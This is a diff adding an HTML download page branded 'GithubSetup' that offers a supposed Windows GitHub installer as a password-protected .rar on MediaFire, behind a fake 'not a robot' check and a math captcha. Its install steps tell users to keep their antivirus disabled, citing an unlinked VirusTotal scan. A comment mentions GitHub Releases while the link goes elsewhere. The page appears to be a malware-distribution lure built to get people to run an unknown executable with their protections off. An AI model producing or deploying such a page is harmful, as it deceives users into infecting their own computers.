@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GithubSetup </title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 250 250'%3E%3Ccircle cx='125' cy='125' r='125' fill='%23000000'/%3E%3Cpath fill='%23ffffff' d='M128.001 34C74.98 34 32 77.02 32 130.011c0 42.407 27.13 78.9 64.766 91.685 4.736.869 6.47-2.057 6.47-4.577 0-2.25-.086-9.71-.13-17.629-26.354 5.729-31.921-11.192-31.921-11.192-4.312-10.956-10.522-13.869-10.522-13.869-8.598-5.878.649-5.757.649-5.757 9.512.667 14.518 9.764 14.518 9.764 8.451 14.483 22.166 10.293 27.573 7.87.848-6.121 3.308-10.301 6.017-12.674-21.045-2.394-43.174-10.526-43.174-46.855 0-10.35 3.696-18.813 9.752-25.44-.98-2.396-4.225-12.043.927-25.106 0 0 7.949-2.545 26.037 9.717a90.86 90.86 0 0 1 23.71-3.191c8.048.037 16.16 1.088 23.723 3.191 18.078-12.262 26.014-9.717 26.014-9.717 5.163 13.063 1.916 22.71.937 25.106 6.067 6.627 9.738 15.09 9.738 25.44 0 36.418-22.166 44.435-43.276 46.783 3.4 2.94 6.43 8.732 6.43 17.598 0 12.71-.116 22.942-.116 26.075 0 2.543 1.72 5.492 6.527 4.562C198.89 208.879 226 172.407 226 130.011 226 77.02 183.021 34 128.001 34Z'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg: #0b0d0f;
+    --card: #131619;
+    --card-2: #1a1e22;
+    --line: #24292e;
+    --text: #f2f4f6;
+    --muted: #8b939c;
+    --green: #34ff8f;
+    --green-dim: #1fae63;
+    --green-glow: rgba(52,255,143,0.3);
+  }
+
+  *{ box-sizing:border-box; margin:0; padding:0; }
+
+  html,body{
+    height:100%;
+    min-height:100vh;
+    background: var(--bg);
+    color: var(--text);
+    font-family:'Inter', sans-serif;
+  }
+
+  body{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding: 28px;
+    box-sizing: border-box;
+  }
+
+  .frame{
+    width:100%;
+    max-width: 1000px;
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 28px;
+    display:grid;
+    grid-template-columns: 1.15fr 0.85fr;
+    overflow:hidden;
+    box-shadow: 0 40px 80px rgba(0,0,0,0.5);
+  }
+
+  /* LEFT */
+  .left{
+    padding: 56px 52px;
+    border-right: 1px solid var(--line);
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+  }
+
+  .icon{
+    width: 84px; height: 84px;
+    border-radius: 20px;
+    background: var(--card-2);
+    border: 1px solid var(--line);
+    display:flex; align-items:center; justify-content:center;
+    margin-bottom: 30px;
+    box-shadow: 0 0 30px var(--green-glow);
+  }
+  .icon svg{ color: var(--green); }
+
+  h1{
+    font-family:'Chakra Petch', sans-serif;
+    font-weight:700;
+    font-size: 26px;
+    letter-spacing: -0.01em;
+    margin-bottom: 10px;
+  }
+  h1 span{ color: var(--green); }
+
+  .sub{
+    color: var(--muted);
+    font-size: 14px;
+    line-height: 1.6;
+    max-width: 40ch;
+    margin-bottom: 38px;
+  }
+
+  .grid2{
+    width:100%;
+    display:grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 14px;
+    margin-bottom: 22px;
+  }
+
+  .stat{
+    background: var(--card-2);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 20px 18px;
+  }
+  .stat .v{
+    font-family:'Chakra Petch', sans-serif;
+    font-weight:700;
+    font-size: 19px;
+    color: var(--green);
+    margin-bottom: 4px;
+  }
+  .stat .k{
+    font-size: 11px;
+    letter-spacing: 0.1em;
+    color: var(--muted);
+    text-transform:uppercase;
+  }
+
+  .howto{
+    width:100%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap: 10px;
+    padding: 16px;
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    color: var(--text);
+    font-size: 14px;
+    font-weight:500;
+    font-family: inherit;
+    background: var(--card-2);
+    cursor:pointer;
+    text-decoration:none;
+    transition: border-color 0.15s ease, background 0.15s ease;
+  }
+  .howto:hover{ border-color: var(--green-dim); background:#1d2226; }
+  .howto svg{ color: var(--muted); flex-shrink:0; }
+
+  /* RIGHT */
+  .right{
+    padding: 40px 40px;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    gap: 22px;
+  }
+
+  .head{ text-align:left; }
+  .head h2{
+    font-family:'Chakra Petch', sans-serif;
+    font-weight:700;
+    font-size: 22px;
+    margin-bottom: 4px;
+  }
+  .head p{
+    font-size: 13px;
+    color: var(--muted);
+  }
+
+  .dl-btn{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap: 10px;
+    width:100%;
+    padding: 17px 20px;
+    background: var(--green);
+    color: #06120c;
+    font-family:'Chakra Petch', sans-serif;
+    font-weight:700;
+    font-size: 15.5px;
+    letter-spacing: 0.02em;
+    border: none;
+    border-radius: 14px;
+    text-decoration:none;
+    cursor:pointer;
+    transition: filter 0.12s ease, box-shadow 0.12s ease, transform 0.12s ease;
+  }
+  .dl-btn:hover{ filter:brightness(1.05); box-shadow: 0 0 0 4px var(--green-glow); }
+  .dl-btn:active{ transform: scale(0.98); }
+
+  .pass-block{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    border: 1px solid var(--line);
+    background: var(--card-2);
+    border-radius: 14px;
+    padding: 14px 18px;
+  }
+  .pass-block .l{ font-size:10.5px; color:var(--muted); letter-spacing:0.1em; text-transform:uppercase; margin-bottom:3px; }
+  .pass-block .v{ font-family:'JetBrains Mono', monospace; font-size:15px; font-weight:700; color:var(--green); letter-spacing:0.05em; user-select:all; }
+  .copy-btn{
+    width:34px; height:34px;
+    border-radius:10px;
+    border: 1px solid var(--line);
+    background: var(--card);
+    color: var(--muted);
+    display:flex; align-items:center; justify-content:center;
+    cursor:pointer;
+    transition: all 0.15s ease;
+  }
+  .copy-btn:hover{ color: var(--green); border-color: var(--green-dim); }
+
+  /* CAPTCHA */
+  .captcha{
+    border: 1px solid var(--line);
+    background: var(--card-2);
+    border-radius: 14px;
+    padding: 16px 18px;
+  }
+  .captcha .cap-label{
+    font-size: 10.5px;
+    color: var(--muted);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    margin-bottom: 12px;
+  }
+  .cap-row{
+    display:flex;
+    align-items:center;
+    gap: 10px;
+  }
+  .cap-question{
+    font-family:'JetBrains Mono', monospace;
+    font-size: 15px;
+    font-weight:600;
+    color: var(--text);
+    white-space: nowrap;
+  }
+  .cap-input{
+    width: 64px;
+    padding: 9px 10px;
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    color: var(--text);
+    font-family:'JetBrains Mono', monospace;
+    font-size: 14px;
+    text-align:center;
+  }
+  .cap-input:focus{ outline:none; border-color: var(--green-dim); }
+  .cap-check{
+    padding: 9px 16px;
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    color: var(--muted);
+    font-size: 12.5px;
+    font-weight:600;
+    cursor:pointer;
+    transition: all 0.15s ease;
+  }
+  .cap-check:hover{ border-color: var(--green-dim); color: var(--text); }
+  .cap-status{
+    margin-top: 10px;
+    font-size: 11.5px;
+    min-height: 14px;
+  }
+  .cap-status.ok{ color: var(--green); }
+  .cap-status.err{ color: #ff6b6b; }
+
+  .dl-btn[data-locked="true"]{
+    opacity: 0.4;
+    pointer-events: none;
+    filter: grayscale(0.4);
+  }
+
+  /* ROBOT CHECKBOX STAGE */
+  .robot-check{
+    border: 1px solid var(--line);
+    background: var(--card-2);
+    border-radius: 14px;
+    padding: 16px 18px;
+    display:flex;
+    align-items:center;
+    gap: 12px;
+    cursor:pointer;
+    transition: border-color 0.15s ease;
+  }
+  .robot-check:hover{ border-color: var(--green-dim); }
+  .robot-check .box{
+    width: 22px; height: 22px;
+    border-radius: 6px;
+    border: 1.5px solid var(--line);
+    background: var(--card);
+    flex-shrink:0;
+    display:flex; align-items:center; justify-content:center;
+    transition: all 0.15s ease;
+  }
+  .robot-check .box svg{
+    width: 14px; height:14px;
+    color: #06120c;
+    opacity:0;
+    transform: scale(0.6);
+    transition: all 0.15s ease;
+  }
+  .robot-check.checked .box{
+    background: var(--green);
+    border-color: var(--green);
+  }
+  .robot-check.checked .box svg{ opacity:1; transform:scale(1); }
+  .robot-check span{ font-size: 13.5px; color: var(--text); }
+
+  .captcha{ display:none; }
+  .captcha.visible{ display:block; }
+
+  /* MODAL */
+  .modal-overlay{
+    display:none;
+    position:fixed; inset:0;
+    background: rgba(0,0,0,0.65);
+    backdrop-filter: blur(3px);
+    align-items:center;
+    justify-content:center;
+    padding: 24px;
+    z-index: 100;
+  }
+  .modal-overlay.open{ display:flex; }
+
+  .modal{
+    width:100%;
+    max-width: 560px;
+    max-height: 85vh;
+    overflow-y:auto;
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 20px;
+    box-shadow: 0 40px 80px rgba(0,0,0,0.6);
+    opacity:0;
+    transform: translateY(14px) scale(0.98);
+    animation: modalIn 0.25s ease forwards;
+  }
+  @keyframes modalIn{ to{ opacity:1; transform:none; } }
+
+  .modal-head{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding: 22px 26px;
+    border-bottom: 1px solid var(--line);
+    position:sticky; top:0;
+    background: var(--card);
+  }
+  .modal-head .title{
+    display:flex; align-items:center; gap:10px;
+    font-family:'Chakra Petch', sans-serif;
+    font-weight:700;
+    font-size: 18px;
+  }
+  .modal-head .title svg{ color: var(--green); }
+  .modal-close{
+    width:32px; height:32px;
+    border-radius:8px;
+    border: 1px solid var(--line);
+    background: var(--card-2);
+    color: var(--muted);
+    display:flex; align-items:center; justify-content:center;
+    cursor:pointer;
+    transition: all 0.15s ease;
+  }
+  .modal-close:hover{ color: var(--text); border-color: var(--green-dim); }
+
+  .modal-body{ padding: 24px 26px 28px; }
+
+  .step{
+    display:flex;
+    gap: 14px;
+    padding: 16px 0;
+    border-bottom: 1px solid var(--line);
+  }
+  .step:last-of-type{ border-bottom:none; }
+  .step .num{
+    width: 26px; height:26px;
+    border-radius: 50%;
+    background: var(--card-2);
+    border: 1px solid var(--line);
+    display:flex; align-items:center; justify-content:center;
+    font-size: 12px;
+    font-weight:700;
+    color: var(--muted);
+    flex-shrink:0;
+  }
+  .step.warn .num{ color:#ffb020; border-color:#3a2c10; }
+  .step h4{
+    font-family:'Chakra Petch', sans-serif;
+    font-size: 14.5px;
+    font-weight:700;
+    color: var(--green);
+    margin-bottom: 4px;
+  }
+  .step.warn h4{ color:#ffb020; }
+  .step p{
+    font-size: 13px;
+    color: var(--muted);
+    line-height:1.6;
+  }
+  .step ul{ margin-top:4px; padding-left:16px; }
+  .step li{ font-size:13px; color:var(--muted); line-height:1.7; }
+
+  .step-pass{
+    margin-top: 10px;
+    display:flex; align-items:center; gap:10px;
+  }
+  .step-pass .lbl{ font-size:13px; font-weight:600; color: var(--text); }
+  .step-pass .val{
+    font-family:'JetBrains Mono', monospace;
+    font-size: 13.5px;
+    font-weight:700;
+    background: var(--card-2);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 5px 10px;
+    color: var(--green);
+  }
+  .step-pass .copy-mini{
+    width:28px; height:28px;
+    border-radius:7px;
+    border:1px solid var(--line);
+    background: var(--card-2);
+    color: var(--muted);
+    display:flex; align-items:center; justify-content:center;
+    cursor:pointer;
+  }
+  .step-pass .copy-mini:hover{ color: var(--green); border-color: var(--green-dim); }
+
+  @media (max-width: 780px){
+    .frame{ grid-template-columns: 1fr; border-radius: 20px; }
+    .left{ border-right:none; border-bottom:1px solid var(--line); padding: 44px 28px; }
+    .right{ padding: 36px 28px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="frame">
+
+  <div class="left">
+    <div class="icon">
+      <svg width="34" height="34" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.58 2 12.25c0 4.53 2.87 8.38 6.84 9.74.5.1.68-.22.68-.5 0-.24-.01-.87-.01-1.71-2.78.62-3.37-1.37-3.37-1.37-.45-1.18-1.11-1.49-1.11-1.49-.91-.64.07-.63.07-.63 1 .07 1.53 1.05 1.53 1.05.89 1.57 2.34 1.12 2.91.85.09-.66.35-1.12.63-1.38-2.22-.26-4.56-1.14-4.56-5.06 0-1.12.39-2.03 1.03-2.75-.1-.26-.45-1.31.1-2.73 0 0 .84-.28 2.75 1.05a9.3 9.3 0 0 1 2.5-.35c.85 0 1.71.12 2.5.35 1.91-1.33 2.75-1.05 2.75-1.05.55 1.42.2 2.47.1 2.73.64.72 1.03 1.63 1.03 2.75 0 3.93-2.34 4.79-4.57 5.05.36.32.68.94.68 1.9 0 1.37-.01 2.47-.01 2.81 0 .28.18.6.69.5A10.26 10.26 0 0 0 22 12.25C22 6.58 17.52 2 12 2z"/></svg>
+    </div>
+
+    <h1 data-i18n="title">GITHUB<span>SETUP</span></h1>
+    <p class="sub" data-i18n="sub">Free Download | Last Update | Windows Version.</p>
+
+    <div class="grid2">
+      <div class="stat"><div class="v">1.0</div><div class="k" data-i18n="version">Version</div></div>
+      <div class="stat"><div class="v">250MB</div><div class="k" data-i18n="size">Size</div></div>
+      <div class="stat"><div class="v">July, 2026</div><div class="k" data-i18n="release">Release</div></div>
+      <div class="stat"><div class="v">Win 10/11</div><div class="k" data-i18n="platform">Platform</div></div>
+    </div>
+
+    <button type="button" class="howto" id="howtoBtn">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
+      <span data-i18n="howto">How to use</span>
+    </button>
+  </div>
+
+  <div class="right">
+    <div class="head">
+      <h2 data-i18n="download">Download</h2>
+      <p data-i18n="headSub">Verified on VirusTotal · no ads · direct link</p>
+    </div>
+
+    <div class="robot-check" id="robotCheck">
+      <div class="box">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
+      </div>
+      <span data-i18n="robotLabel">I'm not a robot</span>
+    </div>
+
+    <div class="captcha" id="captchaBlock">
+      <div class="cap-label" data-i18n="capLabel">Quick check — confirm you're human</div>
+      <div class="cap-row">
+        <span class="cap-question" id="capQuestion">7 + 4 = ?</span>
+        <input type="text" inputmode="numeric" class="cap-input" id="capInput" maxlength="3">
+        <button type="button" class="cap-check" id="capCheck" data-i18n="capCheck">Verify</button>
+      </div>
+      <div class="cap-status" id="capStatus"></div>
+    </div>
+
+    <a href="#" class="dl-btn" id="downloadBtn" data-locked="true">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M12 3v12m0 0l-4-4m4 4l4-4M4 19h16"/></svg>
+      <span data-i18n="dlBtn">Download for Windows</span>
+    </a>
+
+    <div class="pass-block">
+      <div>
+        <div class="l" data-i18n="passLabel">Archive password</div>
+        <div class="v" id="passValue">Github</div>
+      </div>
+      <button class="copy-btn" id="copyBtn">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>
+      </button>
+    </div>
+  </div>
+
+</div>
+
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal">
+    <div class="modal-head">
+      <div class="title">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.58 2 12.25c0 4.53 2.87 8.38 6.84 9.74.5.1.68-.22.68-.5 0-.24-.01-.87-.01-1.71-2.78.62-3.37-1.37-3.37-1.37-.45-1.18-1.11-1.49-1.11-1.49-.91-.64.07-.63.07-.63 1 .07 1.53 1.05 1.53 1.05.89 1.57 2.34 1.12 2.91.85.09-.66.35-1.12.63-1.38-2.22-.26-4.56-1.14-4.56-5.06 0-1.12.39-2.03 1.03-2.75-.1-.26-.45-1.31.1-2.73 0 0 .84-.28 2.75 1.05a9.3 9.3 0 0 1 2.5-.35c.85 0 1.71.12 2.5.35 1.91-1.33 2.75-1.05 2.75-1.05.55 1.42.2 2.47.1 2.73.64.72 1.03 1.63 1.03 2.75 0 3.93-2.34 4.79-4.57 5.05.36.32.68.94.68 1.9 0 1.37-.01 2.47-.01 2.81 0 .28.18.6.69.5A10.26 10.26 0 0 0 22 12.25C22 6.58 17.52 2 12 2z"/></svg>
+        <span data-i18n="modalTitle">How to install</span>
+      </div>
+      <button class="modal-close" id="modalClose">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
+      </button>
+    </div>
+    <div class="modal-body">
+      <div class="step">
+        <div class="num">1</div>
+        <div>
+          <h4 data-i18n="s1h">Download the archive</h4>
+          <p data-i18n="s1p">Click "Download for Windows" above and save the .rar file to your computer.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="num">2</div>
+        <div>
+          <h4 data-i18n="s2h">Extract using WinRAR or 7-Zip</h4>
+          <p data-i18n="s2p">Right-click the archive → Extract to folder.</p>
+          <div class="step-pass">
+            <span class="lbl" data-i18n="s2lbl">Password:</span>
+            <span class="val">Github</span>
+            <button class="copy-mini" id="modalCopy">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>
+            </button>
+          </div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="num">3</div>
+        <div>
+          <h4 data-i18n="s3h">Run the installer</h4>
+          <p data-i18n="s3p">Open the extracted folder and run the setup file. Follow the on-screen instructions.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="num">4</div>
+        <div>
+          <h4 data-i18n="s4h">Follow the installation wizard</h4>
+          <p data-i18n="s4p">Choose the installation path and components you want to install.</p>
+        </div>
+      </div>
+      <div class="step warn">
+        <div class="num">!</div>
+        <div>
+          <h4 data-i18n="s5h">Important notes</h4>
+          <ul>
+            <li data-i18n="s5l1">Keep your antivirus disabled — the file has already been scanned on VirusTotal, see the report link on the page.</li>
+            <li data-i18n="s5l2">If the app doesn't launch, try restarting your PC.</li>
+            <li data-i18n="s5l3">Make sure you have an active internet connection.</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ---- "not a robot" checkbox reveals the real captcha ----
+  document.getElementById('robotCheck').addEventListener('click', function(){
+    this.classList.add('checked');
+    document.getElementById('captchaBlock').classList.add('visible');
+    document.getElementById('capInput').focus();
+  });
+
+  // ---- lightweight math captcha ----
+  let capAnswer = 0;
+
+  function newCaptcha(){
+    const a = Math.floor(Math.random() * 8) + 2;
+    const b = Math.floor(Math.random() * 8) + 2;
+    capAnswer = a + b;
+    document.getElementById('capQuestion').textContent = `${a} + ${b} = ?`;
+    document.getElementById('capInput').value = '';
+    document.getElementById('capStatus').textContent = '';
+    document.getElementById('capStatus').className = 'cap-status';
+    document.getElementById('downloadBtn').setAttribute('data-locked', 'true');
+  }
+
+  function checkCaptcha(){
+    const val = parseInt(document.getElementById('capInput').value, 10);
+    const statusEl = document.getElementById('capStatus');
+    if (val === capAnswer){
+      statusEl.textContent = 'Verified — download unlocked';
+      statusEl.className = 'cap-status ok';
+      document.getElementById('downloadBtn').removeAttribute('data-locked');
+    } else {
+      statusEl.textContent = 'Not quite — try the new one';
+      statusEl.className = 'cap-status err';
+      newCaptcha();
+    }
+  }
+
+  document.getElementById('capCheck').addEventListener('click', checkCaptcha);
+  document.getElementById('capInput').addEventListener('keydown', function(e){
+    if (e.key === 'Enter') checkCaptcha();
+  });
+
+  newCaptcha();
+
+  // ---- how-to-use modal ----
+  const modalOverlay = document.getElementById('modalOverlay');
+  document.getElementById('howtoBtn').addEventListener('click', () => modalOverlay.classList.add('open'));
+  document.getElementById('modalClose').addEventListener('click', () => modalOverlay.classList.remove('open'));
+  modalOverlay.addEventListener('click', (e) => { if (e.target === modalOverlay) modalOverlay.classList.remove('open'); });
+  document.addEventListener('keydown', (e) => { if (e.key === 'Escape') modalOverlay.classList.remove('open'); });
+  document.getElementById('modalCopy').addEventListener('click', function(){
+    navigator.clipboard.writeText(document.getElementById('passValue').textContent);
+    this.style.color = 'var(--green)';
+    setTimeout(()=>{ this.style.color = ''; }, 1200);
+  });
+
+  document.getElementById('copyBtn').addEventListener('click', function(){
+    const val = document.getElementById('passValue').textContent;
+    navigator.clipboard.writeText(val);
+    const btn = document.getElementById('copyBtn');
+    btn.style.color = 'var(--green)';
+    setTimeout(()=>{ btn.style.color = ''; }, 1200);
+  });
+
+  // Replace href of the download button with your real GitHub Releases link
+  document.getElementById('downloadBtn').setAttribute('href', 'https://app.mediafire.com/folder/d785we1aigw06');
+</script>
+
+</body>
+</html>
